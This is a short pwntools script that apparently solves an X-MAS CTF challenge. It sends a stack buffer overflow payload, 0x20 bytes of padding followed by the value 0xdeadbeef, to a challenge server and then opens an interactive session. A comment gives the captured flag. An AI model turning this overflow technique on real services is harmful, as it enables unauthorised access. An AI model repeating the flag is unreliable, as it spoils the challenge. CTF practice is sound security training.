from pwn import *
payload = b''.join([
    b'A'*(0x30 - 0x10),
    p64(0xdeadbeef),
])
p = remote('challs.xmas.htsp.ro', 2008)
p.sendlineafter('you?', payload)
p.interactive()
# X-MAS{ah_yes__i_d0_rememb3r_you}